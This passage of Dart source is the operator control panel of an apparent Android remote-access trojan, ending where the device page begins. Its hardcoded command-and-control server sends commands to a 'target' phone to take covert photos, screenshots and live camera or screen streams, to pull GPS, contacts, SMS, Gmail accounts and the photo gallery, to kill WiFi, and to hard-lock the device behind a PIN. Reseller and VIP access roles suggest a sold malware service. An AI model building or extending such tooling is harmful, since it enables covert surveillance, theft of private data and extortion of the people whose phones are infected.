// ═══════════════════════════════════════════════════════════════════════════
//  CONTROL CENTER — HELL ELEGANCE BRUTAL (ppp.jpg + disko + spider + glitch)
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ═══════════════════════════════════════════════════════════════════════════
class _C {
  static const bg         = Color(0xFF020004);
  static const bgDeep     = Color(0xFF050108);
  static const s1         = Color(0xFF0A0310);
  static const s2         = Color(0xFF0E0512);
  static const s3         = Color(0xFF120616);
  static const card       = Color(0xFF080210);

  static const crimson    = Color(0xFF8B1526);
  static const crimsonUp  = Color(0xFFC41E3A);
  static const maroon     = Color(0xFF4A0A14);
  static const burgundy   = Color(0xFF2A0510);

  static const gold       = Color(0xFFB8860B);
  static const goldBright = Color(0xFFE5B94D);
  static const goldGlow   = Color(0xFFF4D03F);
  static const neonGold   = Color(0xFFFFD700);

  static const textP = Color(0xFFF5EDE5);
  static const textS = Color(0xFFB8A090);
  static const textM = Color(0xFF6B5650);

  static const bord     = Color(0xFF2A1418);
  static const bordGlow = Color(0xFF3D1E24);

  static const green  = Color(0xFF50C878);
  static const amber  = Color(0xFFE09540);
  static const red    = Color(0xFFE5384A);
  static const vio    = Color(0xFFAA00FF);

  static const cyan   = Color(0xFFFFB84D);
  static const cyan2  = Color(0xFFFFD700);
  static const cyanD  = Color(0xFFE09540);

  static const disco1  = Color(0xFFFF3366);
  static const disco2  = Color(0xFFFFAA00);
  static const disco3  = Color(0xFFFF00CC);
  static const disco4  = Color(0xFF00FFFF);
  static const disco5  = Color(0xFFAA00FF);
  static const disco6  = Color(0xFF00FF66);

  static Color discoColor(double p) {
    final colors = [disco1, disco2, disco3, disco4, disco5, disco6];
    final idx = (p * colors.length).floor() % colors.length;
    final nextIdx = (idx + 1) % colors.length;
    final t = (p * colors.length) % 1.0;
    return Color.lerp(colors[idx], colors[nextIdx], t) ?? colors[idx];
  }
}

// ═══════════════════════════════════════════════════════════════════════════
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with TickerProviderStateMixin {
  static const _kBase = 'http://www.rexylegal.rxpedia.web.id:2060';
  static const Set<String> _needPoll = {'take_photo','get_screen','get_location','track_gps','get_contacts','dump_contacts','get_gmails','get_sms','get_gallery'};

  late TabController _tabs;
  late AnimationController _pulse, _glow;
  late AnimationController _bgCtrl, _scanCtrl, _discoCtrl, _glitchCtrl, _webCtrl;
  late Animation<double> _pulseA, _scan, _disco, _glitch;

  bool _sending = false;
  final List<String> _log = [];
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);
  final List<Map<String,String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';
  bool   get _online  => widget.targetDevice?['online'] == true;
  bool get _hasAccess => ['owner','high owner','high admin','admin','vip','reseller'].contains(widget.role.toLowerCase());

  @override
  void initState() {
    super.initState();
    _tabs  = TabController(length: 6, vsync: this);
    _pulse = AnimationController(vsync: this, duration: const Duration(milliseconds: 1800))..repeat(reverse: true);
    _glow  = AnimationController(vsync: this, duration: const Duration(milliseconds: 3000))..repeat(reverse: true);

    _bgCtrl    = AnimationController(vsync:this, duration:const Duration(seconds:30))..repeat();
    _scanCtrl  = AnimationController(vsync:this, duration:const Duration(seconds:6))..repeat();
    _discoCtrl = AnimationController(vsync:this, duration:const Duration(seconds:10))..repeat();
    _glitchCtrl= AnimationController(vsync:this, duration:const Duration(milliseconds:3500))..repeat();
    _webCtrl   = AnimationController(vsync:this, duration:const Duration(seconds:8))..repeat();

    _pulseA = Tween<double>(begin:0.5, end:1.0).animate(CurvedAnimation(parent:_pulse, curve:Curves.easeInOut));
    _scan   = Tween<double>(begin:0.0, end:1.0).animate(CurvedAnimation(parent:_scanCtrl, curve:Curves.linear));
    _disco  = Tween<double>(begin:0.0, end:1.0).animate(CurvedAnimation(parent:_discoCtrl, curve:Curves.linear));
    _glitch = Tween<double>(begin:0.0, end:1.0).animate(CurvedAnimation(parent:_glitchCtrl, curve:Curves.linear));

    if (_hasAccess) WidgetsBinding.instance.addPostFrameCallback((_) => _cmd('force_open', silent: true));
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel(); _chatTimer?.cancel();
    _tabs.dispose(); _pulse.dispose(); _glow.dispose();
    _bgCtrl.dispose(); _scanCtrl.dispose(); _discoCtrl.dispose();
    _glitchCtrl.dispose(); _webCtrl.dispose();
    _chatCtrl.dispose(); _chatScroll.dispose(); _frameN.dispose();
    super.dispose();
  }

  void _addLog(String m) { if (!mounted) return; setState(() { _log.insert(0, '${DateTime.now().toString().substring(11,19)}  $m'); if (_log.length > 60) _log.removeLast(); }); }

  void _toast(String m, {Color c = _C.cyan}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).clearSnackBars();
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _C.card,
      content: Row(children: [
        Container(width: 22, height: 22,
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [c.withOpacity(0.3), c.withOpacity(0.1)]),
            shape: BoxShape.circle),
          child: Icon(
            c == _C.green ? Icons.check_rounded : c == _C.red ? Icons.error_rounded : Icons.info_rounded,
            color: c, size: 13)),
        const SizedBox(width: 10),
        Text(m, style: const TextStyle(fontFamily:'ShareTechMono', color: _C.textP, fontSize: 12, fontWeight: FontWeight.w600)),
      ]),
      duration: const Duration(seconds: 2), behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: c.withOpacity(0.5), width: 1.2)),
      margin: const EdgeInsets.all(16),
    ));
  }

  Future<void> _cmd(String cmd, {String extra='', bool silent=false}) async {
    if (_id=='unknown') { if (!silent) _toast('ID target tidak valid', c: _C.amber); return; }
    if (!silent) setState(() => _sending=true);
    try {
      final res = await http.post(Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));
      if (res.statusCode == 200) {
        if (!silent) { _addLog('✓ $cmd'); _toast('Perintah terkirim', c: _C.green); }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else { if (!silent) { _addLog('✗ $cmd (${res.statusCode})'); _toast('Target offline', c: _C.amber); } }
    } catch (e) { if (!silent) { _addLog('✗ $cmd error'); _toast('Koneksi gagal', c: _C.red); } }
    finally { if (!silent && mounted) setState(() => _sending=false); }
  }

  void _poll(String cmd) async {
    final max = cmd=='get_gallery' ? 60 : 30;
    int n=0; bool got=false;
    while (n<max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000)); n++;
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id')).timeout(const Duration(seconds: 8));
        if (res.statusCode==200 && res.body.isNotEmpty && res.body!='{}') {
          final d = jsonDecode(res.body);
          if (d['data']!=null) { final rc = d['cmd']?.toString()??''; if (rc.isEmpty||rc==cmd) { _onResponse(cmd, d['data']); got=true; } }
        }
      } catch (_) {}
    }
    if (!got && mounted) { _addLog('↯ Timeout: $cmd'); _toast('Timeout', c: _C.amber); }
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':   final b=d['image_base64']?.toString()??''; if (b.isEmpty){_toast('Foto kosong',c:_C.amber);return;} _addLog('📷 Foto diterima'); _imgDialog(b,'Foto Target'); break;
      case 'get_screen':   final b=d['image_base64']?.toString()??''; if (b.isEmpty) return; _addLog('🖥 Screenshot'); _imgDialog(b,'Screenshot'); break;
      case 'get_location': case 'track_gps': _addLog('📍 GPS diterima'); _locationDialog(d['lat'],d['lng']); break;
      case 'get_contacts': case 'dump_contacts': _addLog('👥 ${(d['contacts'] as List?)?.length??0} kontak'); _contactsSheet(d['contacts']??[]); break;
      case 'get_gmails':   _addLog('📧 Akun diterima'); _textDialog('Gmail & Akun', d['accounts']?.toString()??'-'); break;
      case 'get_sms':      _addLog('💬 ${(d['sms'] as List?)?.length??0} SMS'); _smsSheet(d['sms']??[]); break;
      case 'get_gallery':  _addLog('🖼 ${(d['images'] as List?)?.length??0} foto'); _gallerySheet(d['images']??[]); break;
      default: _addLog('✓ $cmd selesai');
    }
  }

  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() { _liveOn=true; _frame=null; _liveTitle=mode=='live_camera_start'?(extra=='front'?'KAMERA DEPAN':'KAMERA BELAKANG'):'SCREEN'; _frmCount=0; _fps=0; _fpsTs=DateTime.now(); });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id')).timeout(const Duration(milliseconds: 500));
        if (res.statusCode==200) {
          final raw = (jsonDecode(res.body)['frame']??'').toString();
          if (raw.isNotEmpty && mounted) {
            final bytes = base64Decode(raw.contains(',') ? raw.split(',').last : raw);
            setState(() { _frame=bytes; _frmCount++; final ms=DateTime.now().difference(_fpsTs).inMilliseconds; if (ms>=1000){_fps=(_frmCount*1000/ms).round();_frmCount=0;_fpsTs=DateTime.now();} });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() { _liveTimer?.cancel(); if (mounted) setState(() { _liveOn=false; _frame=null; }); _cmd('live_stop', silent:true); _addLog('■ Live dihentikan'); }

  void _pollChat() async {
    if (_id=='unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id')).timeout(const Duration(seconds: 4));
      if (res.statusCode==200) {
        final msgs = (jsonDecode(res.body)['messages'] as List?) ?? [];
        if (msgs.length!=_chat.length && mounted) {
          setState(() { _chat.clear(); for (final m in msgs) _chat.add({'from':m['from']?.toString()??'','text':m['text']?.toString()??'','time':m['time']?.toString()??''}); });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from':'owner','text':text.trim(),'time':TimeOfDay.now().format(context)}));
    _scrollChat();
    try { await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'), headers:{'Content-Type':'application/json'}, body: jsonEncode({'text':text.trim(),'from':'owner'})).timeout(const Duration(seconds:5)); } catch (_) {}
  }

  void _scrollChat() { Future.delayed(const Duration(milliseconds:100), () { if (_chatScroll.hasClients) _chatScroll.animateTo(_chatScroll.position.maxScrollExtent, duration:const Duration(milliseconds:200), curve:Curves.easeOut); }); }

  @override
  Widget build(BuildContext context) {
    if (!_hasAccess) return _accessDenied();
    return Scaffold(
      backgroundColor: _C.bg,
      body: Stack(children: [
        // ppp.jpg background
        Positioned.fill(
          child: Image.asset(
            'assets/images/ppp.jpg',
            fit: BoxFit.cover,
            errorBuilder: (_, __, ___) => Container(color: _C.bg),
          ),
        ),
        Positioned.fill(
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  _C.bg.withOpacity(0.85),
                  _C.bgDeep.withOpacity(0.75),
                  _C.bg.withOpacity(0.92),
                ],
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
              ),
            ),
          ),
        ),
        AnimatedBuilder(
          animation: Listenable.merge([_bgCtrl, _discoCtrl, _glitchCtrl]),
          builder: (_, __) => CustomPaint(
            painter: _HoloBgPainter(_bgCtrl.value, _disco.value, _glitch.value),
            child: const SizedBox.expand(),
          ),
        ),
        AnimatedBuilder(animation:_scan, builder:(_,__)=>Positioned(
          top: _scan.value * MediaQuery.of(context).size.height,
          left:0, right:0,
          child: Container(
            height:1.5,
            decoration:BoxDecoration(
              gradient:LinearGradient(colors:[
                Colors.transparent, _C.gold.withOpacity(.12),
                _C.crimsonUp.withOpacity(.3), _C.gold.withOpacity(.12),
                Colors.transparent,
              ]),
            ),
          ),
        )),
        SafeArea(
          child: Column(children: [
            _buildAppBar(),
            _buildLogBar(),
            Expanded(child: TabBarView(controller: _tabs, children: [
              _pageLive(), _pageCamera(), _pageIntel(), _pageAudio(), _pageLock(), _pageDevice(),
            ])),
          ]),
        ),
      ]),
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // APPBAR
  // ══════════════════════════════════════════════════════════════════════════
  Widget _buildAppBar() => Padding(
    padding: const EdgeInsets.fromLTRB(14, 12, 14, 0),
    child: AnimatedBuilder(
      animation: _discoCtrl,
      builder: (_, __) {
        final dc = _C.discoColor(_disco.value);
        return Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            color: Colors.black.withOpacity(0.4),
            gradient: LinearGradient(
              colors: [dc.withOpacity(0.15), dc.withOpacity(0.03)],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
            border: Border.all(color: _C.goldBright.withOpacity(0.5), width: 1.2),
            boxShadow: [
              BoxShadow(color: dc.withOpacity(0.3), blurRadius: 20, spreadRadius: 1),
              BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 10, offset: const Offset(0, 4)),
            ],
          ),
          child: Stack(children: [
            Positioned(top: 4, left: 4, child: _corner(_C.goldBright, 12, 1.5, topLeft: true)),
            Positioned(top: 4, right: 4, child: _corner(_C.goldBright, 12, 1.5, topRight: true)),
            Column(children: [
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
                child: Row(children: [
                  // Back
                  GestureDetector(
                    onTap: () { if (_liveOn) _stopLive(); Navigator.pop(context); },
                    child: Container(
                      width: 40, height: 40,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        gradient: const LinearGradient(
                          colors: [_C.crimsonUp, _C.maroon],
                          begin: Alignment.topLeft, end: Alignment.bottomRight,
                        ),
                        border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                        boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.4), blurRadius: 10)],
                      ),
                      child: const Icon(Icons.arrow_back_ios_new_rounded, color: _C.goldBright, size: 16),
                    ),
                  ),
                  const SizedBox(width: 12),
                  // Title
                  Expanded(child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(_model, style: const TextStyle(
                        fontFamily: 'Ganang', color: _C.textP,
                        fontSize: 13, fontWeight: FontWeight.w900, letterSpacing: 1),
                        overflow: TextOverflow.ellipsis),
                      Row(children: [
                        AnimatedBuilder(
                          animation: _pulse,
                          builder: (_,__) => Container(
                            width: 5, height: 5,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: _online ? _C.green : _C.textM,
                              boxShadow: _online ? [BoxShadow(
                                color: _C.green.withOpacity(0.5 + 0.4 * _pulseA.value),
                                blurRadius: 6)] : []),
                          ),
                        ),
                        const SizedBox(width: 5),
                        Flexible(child: Text('Batt: $_battery%  •  $_id',
                          style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            color: _C.textS, fontSize: 8),
                          overflow: TextOverflow.ellipsis)),
                      ]),
                    ],
                  )),
                  // Live indicator
                  if (_liveOn)
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        gradient: LinearGradient(
                          colors: [_C.green.withOpacity(0.2), _C.green.withOpacity(0.06)]),
                        border: Border.all(color: _C.green.withOpacity(0.5)),
                      ),
                      child: Row(mainAxisSize: MainAxisSize.min, children: [
                        AnimatedBuilder(
                          animation: _pulse,
                          builder: (_,__) => Container(
                            width: 6, height: 6,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle, color: _C.green,
                              boxShadow: [BoxShadow(
                                color: _C.green.withOpacity(0.8 * _pulseA.value),
                                blurRadius: 6)]),
                          ),
                        ),
                        const SizedBox(width: 5),
                        Text('$_fps fps', style: const TextStyle(
                          fontFamily: 'Orbitron', color: _C.green,
                          fontSize: 9, fontWeight: FontWeight.w900)),
                      ]),
                    ),
                  const SizedBox(width: 6),
                  // Refresh
                  GestureDetector(
                    onTap: () { setState((){}); _cmd('force_open', silent:true); },
                    child: Container(
                      width: 34, height: 34,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        color: _C.goldBright.withOpacity(0.12),
                        border: Border.all(color: _C.goldBright.withOpacity(0.4)),
                      ),
                      child: const Icon(Icons.refresh_rounded, color: _C.goldBright, size: 15),
                    ),
                  ),
                ]),
              ),
              // Tab bar
              Container(
                decoration: BoxDecoration(
                  border: Border(top: BorderSide(color: _C.goldBright.withOpacity(0.3), width: 1)),
                ),
                child: TabBar(
                  controller: _tabs,
                  isScrollable: true,
                  indicator: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    gradient: LinearGradient(
                      colors: [_C.crimsonUp.withOpacity(0.5), _C.maroon.withOpacity(0.3)],
                      begin: Alignment.topLeft, end: Alignment.bottomRight,
                    ),
                    border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                  ),
                  indicatorSize: TabBarIndicatorSize.label,
                  labelColor: _C.goldBright,
                  unselectedLabelColor: _C.textM,
                  labelStyle: const TextStyle(
                    fontFamily: 'Ganang',
                    fontSize: 9, fontWeight: FontWeight.w900, letterSpacing: 1.2),
                  unselectedLabelStyle: const TextStyle(
                    fontFamily: 'Ganang',
                    fontSize: 9, fontWeight: FontWeight.w600, letterSpacing: 1),
                  labelPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  tabs: const [
                    Tab(text: 'LIVE'), Tab(text: 'CAMERA'), Tab(text: 'INTEL'),
                    Tab(text: 'AUDIO'), Tab(text: 'LOCK'), Tab(text: 'DEVICE'),
                  ],
                ),
              ),
            ]),
          ]),
        );
      },
    ),
  );

  // ══════════════════════════════════════════════════════════════════════════
  // LOG BAR
  // ══════════════════════════════════════════════════════════════════════════
  Widget _buildLogBar() => Container(
    height: 36,
    margin: const EdgeInsets.fromLTRB(14, 10, 14, 0),
    padding: const EdgeInsets.symmetric(horizontal: 14),
    decoration: BoxDecoration(
      borderRadius: BorderRadius.circular(10),
      color: Colors.black.withOpacity(0.4),
      border: Border.all(color: _C.goldBright.withOpacity(0.3), width: 1),
    ),
    child: Row(children: [
      AnimatedBuilder(
        animation: _pulse,
        builder: (_,__) => Container(
          width: 6, height: 6,
          decoration: BoxDecoration(
            shape: BoxShape.circle, color: _C.goldBright,
            boxShadow: [BoxShadow(
              color: _C.goldBright.withOpacity(0.5 + 0.5 * _pulseA.value),
              blurRadius: 6)]),
        ),
      ),
      const SizedBox(width: 8),
      const Text('LOG ', style: TextStyle(
        fontFamily: 'Orbitron', color: _C.textM,
        fontSize: 8, fontWeight: FontWeight.w900, letterSpacing: 2)),
      Expanded(child: Text(
        _log.isEmpty ? 'Ready...' : _log.first,
        style: const TextStyle(
          fontFamily: 'ShareTechMono',
          color: _C.textS, fontSize: 9),
        maxLines: 1, overflow: TextOverflow.ellipsis)),
    ]),
  );

  // ══════════════════════════════════════════════════════════════════════════
  // LIVE PAGE
  // ══════════════════════════════════════════════════════════════════════════
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(14), children: [
    _secHeader('LIVE STREAM', Icons.cast_rounded, _C.cyan),
    const SizedBox(height: 14),
    AnimatedContainer(
      duration: const Duration(milliseconds: 400), curve: Curves.easeInOut,
      height: _liveOn ? 220 : 88,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: _liveOn ? [_C.s3, _C.s2] : [_C.card, _C.bgDeep]),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: _liveOn ? _C.goldBright.withOpacity(0.6) : _C.bord,
          width: _liveOn ? 1.5 : 1),
        boxShadow: _liveOn ? [
          BoxShadow(color: _C.goldBright.withOpacity(0.2), blurRadius: 24),
        ] : []),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(15),
        child: Stack(children: [
          if (_liveOn) Positioned.fill(child: CustomPaint(
            painter: _SpiderWebPainter(
              progress: _webCtrl.value, color: _C.goldBright, opacity: 0.1),
          )),
          Center(
            child: _liveOn && _frame != null
              ? Image.memory(_frame!, fit: BoxFit.contain,
                  gaplessPlayback: true, filterQuality: FilterQuality.low)
              : Row(mainAxisSize: MainAxisSize.min, children: [
                  Icon(_liveOn ? Icons.hourglass_top_rounded : Icons.cast_connected_rounded,
                    color: _C.textM, size: 20),
                  const SizedBox(width: 10),
                  Text(_liveOn ? 'Menunggu frame...' : 'Stream inactive',
                    style: const TextStyle(
                      fontFamily: 'Ganang', color: _C.textM, fontSize: 12)),
                ]),
          ),
        ]),
      ),
    ),
    const SizedBox(height: 14),
    Row(children: [
      Expanded(child: _btn('Live Camera', _C.goldBright, Icons.videocam_rounded, () {
        _showCamPicker((s) { _startLive('live_camera_start', s); _showLiveDialog(); });
      })),
      const SizedBox(width: 10),
      Expanded(child: _btn('Live Screen', _C.vio, Icons.desktop_windows_rounded, () {
        _startLive('live_screen_start', ''); _showLiveDialog();
      })),
    ]),
    if (_liveOn) ...[
      const SizedBox(height: 10),
      _btn('■  Stop Live', _C.red, Icons.stop_circle_rounded, _stopLive, outlined: true),
    ],
  ]);

  // ══════════════════════════════════════════════════════════════════════════
  // CAMERA PAGE
  // ══════════════════════════════════════════════════════════════════════════
  Widget _pageCamera() => ListView(padding: const EdgeInsets.all(14), children: [
    _secHeader('CAMERA & VISUAL', Icons.camera_rounded, _C.crimsonUp),
    const SizedBox(height: 14),
    _btn('Ambil Foto', _C.goldBright, Icons.camera_alt_rounded,
      () => _showCamPicker((s) => _cmd('take_photo', extra:s))),
    const SizedBox(height: 10),
    _btn('Screenshot', _C.vio, Icons.screenshot_monitor_rounded,
      () => _cmd('get_screen')),
    const SizedBox(height: 10),
    _btn('Set Wallpaper', _C.amber, Icons.image_rounded,
      () => _inputDlg('Set Wallpaper','Image URL',(v)=>_cmd('set_wallpaper',extra:v))),
    const SizedBox(height: 10),
    Row(children: [
      Expanded(child: _btn('Flash ON', _C.amber, Icons.flash_on_rounded,
        () => _cmd('flash_strobe'))),
      const SizedBox(width: 10),
      Expanded(child: _btn('Flash OFF', _C.textS, Icons.flash_off_rounded,
        () => _cmd('stop_strobe'), outlined: true)),
    ]),
  ]);

  // ══════════════════════════════════════════════════════════════════════════
  // INTEL PAGE
  // ══════════════════════════════════════════════════════════════════════════
  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(14), children: [
    _secHeader('INTELLIGENCE', Icons.radar_rounded, _C.vio),
    const SizedBox(height: 14),
    _btn('Daftar Kontak', _C.goldBright, Icons.contact_page_rounded,
      () => _cmd('get_contacts')),
    const SizedBox(height: 10),
    _btn('Lokasi GPS', _C.green, Icons.satellite_alt_rounded,
      () => _cmd('get_location')),
    const SizedBox(height: 10),
    _btn('Gmail & Akun', _C.goldBright, Icons.manage_accounts_rounded,
      () => _cmd('get_gmails')),
    const SizedBox(height: 10),
    _btn('SMS Inbox', _C.vio, Icons.mark_unread_chat_alt_rounded,
      () => _cmd('get_sms')),
    const SizedBox(height: 10),
    _btn('Notifikasi', _C.amber, Icons.notifications_active_rounded,
      () => _fetchNotif()),
    const SizedBox(height: 10),
    _btn('Gallery (5 Foto)', _C.goldBright, Icons.photo_library_rounded,
      () => _cmd('get_gallery',extra:'5')),
    const SizedBox(height: 10),
    _btn('Buka Notif Access', _C.textS, Icons.admin_panel_settings_rounded,
      () => _cmd('open_notification_settings'), outlined: true),
  ]);

  // ══════════════════════════════════════════════════════════════════════════
  // AUDIO PAGE
  // ══════════════════════════════════════════════════════════════════════════
  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(14), children: [
    _secHeader('AUDIO & NETWORK', Icons.graphic_eq_rounded, _C.goldBright),
    const SizedBox(height: 14),
    _btn('Play Audio', _C.goldBright, Icons.play_circle_fill_rounded,
      () => _inputDlg('Play Audio','URL MP3',(v)=>_cmd('play_audio',extra:v))),
    const SizedBox(height: 10),
    _btn('Stop Audio', _C.textS, Icons.stop_circle_rounded,
      () => _cmd('stop_audio'), outlined: true),
    const SizedBox(height: 10),
    _btn('Vibrate Loop', _C.vio, Icons.vibration_rounded,
      () => _cmd('vibrate_loop')),
    const SizedBox(height: 10),
    _btn('Buka URL', _C.amber, Icons.travel_explore_rounded,
      () => _inputDlg('Open URL','https://...',(v)=>_cmd('open_url',extra:v))),
    const SizedBox(height: 10),
    _btn('Kill WiFi', _C.red, Icons.wifi_off_rounded,
      () => _cmd('kill_wifi')),
  ]);

  // ══════════════════════════════════════════════════════════════════════════
  // LOCK PAGE
  // ══════════════════════════════════════════════════════════════════════════
  Widget _pageLock() => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(14), children: [
      _secHeader('REMOTE LOCK', Icons.lock_rounded, _C.vio),
      const SizedBox(height: 14),
      _btn('Lock + Live Chat', _C.goldBright, Icons.lock_person_rounded,
        () => _lockLiveDlg()),
      const SizedBox(height: 10),
      _btn('Lock + Pesan', _C.amber, Icons.lock_clock_rounded,
        () => _lockChatDlg()),
      const SizedBox(height: 10),
      _btn('Hard Lock', _C.red, Icons.lock_outline_rounded, () {
        _inputDlg('Lock Device','Pesan di layar',(msg){
          _inputDlg('PIN Unlock','4 digit PIN',
            (pin)=>_cmd('hard_lock',extra:'$msg|$pin'), isNum:true);
        });
      }),
      const SizedBox(height: 10),
      _btn('Unlock', _C.green, Icons.lock_open_rounded,
        () => _cmd('unlock'), outlined: true),
      const SizedBox(height: 20),
      _secHeader('CHAT KE TARGET', Icons.forum_rounded, _C.goldBright),
      const SizedBox(height: 12),
      Container(
        height: 200,
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [_C.card, _C.bgDeep]),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.goldBright.withOpacity(0.3), width: 1.2)),
        child: _chat.isEmpty
          ? const Center(child: Text('Belum ada pesan',
              style: TextStyle(fontFamily: 'Ganang', color: _C.textM, fontSize: 11)))
          : ListView.builder(
              controller: _chatScroll, padding: const EdgeInsets.all(10),
              itemCount: _chat.length,
              itemBuilder: (_, i) {
                final m = _chat[i];
                final isOwner = m['from']=='owner';
                return Align(
                  alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                  child: Container(
                    margin: const EdgeInsets.symmetric(vertical: 3),
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.72),
                    decoration: BoxDecoration(
                      gradient: isOwner ? const LinearGradient(
                        colors: [_C.crimsonUp, _C.maroon]) : null,
                      color: isOwner ? null : _C.s3,
                      borderRadius: BorderRadius.circular(12),
                      border: isOwner ? Border.all(color: _C.goldBright.withOpacity(0.4)) : Border.all(color: _C.bord),
                      boxShadow: isOwner ? [BoxShadow(
                        color: _C.crimson.withOpacity(0.3), blurRadius: 8)] : []),
                    child: Column(
                      crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start,
                      children: [
                        Text(m['text']??'', style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          color: isOwner ? _C.textP : _C.textP,
                          fontSize: 12, fontWeight: FontWeight.w600)),
                        const SizedBox(height: 2),
                        Text(m['time']??'', style: TextStyle(
                          fontFamily: 'Orbitron',
                          color: isOwner ? _C.goldBright.withOpacity(0.6) : _C.textM,
                          fontSize: 8)),
                      ],
                    ),
                  ),
                );
              }),
      ),
    ])),
    Container(
      padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.4),
        border: Border(top: BorderSide(color: _C.goldBright.withOpacity(0.3)))),
      child: Row(children: [
        Expanded(child: TextField(
          controller: _chatCtrl,
          style: const TextStyle(
            fontFamily: 'ShareTechMono',
            color: _C.textP, fontSize: 13),
          decoration: InputDecoration(
            hintText: 'Kirim pesan ke target...',
            hintStyle: const TextStyle(
              fontFamily: 'ShareTechMono',
              color: _C.textM, fontSize: 12),
            filled: true, fillColor: _C.card,
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 11),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(22),
              borderSide: BorderSide(color: _C.goldBright.withOpacity(0.3))),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(22),
              borderSide: BorderSide(color: _C.goldBright.withOpacity(0.3))),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(22),
              borderSide: BorderSide(color: _C.goldBright, width: 1.5)),
          ),
          onSubmitted: _sendChat)),
        const SizedBox(width: 8),
        GestureDetector(
          onTap: () => _sendChat(_chatCtrl.text),
          child: Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_C.crimsonUp, _C.maroon]),
              shape: BoxShape.circle,
              border: Border.all(color: _C.goldBright.withOpacity(0.5)),
              boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.4), blurRadius: 12)]),
            child: const Icon(Icons.send_rounded, color: _C.goldBright, size: 17))),
      ]),
    ),
  ]);

  // ══════════════════════════════════════════════════════════════════════════
  // DEVICE PAGE
  // ══════════════════════════════════════════════════════════════════════════
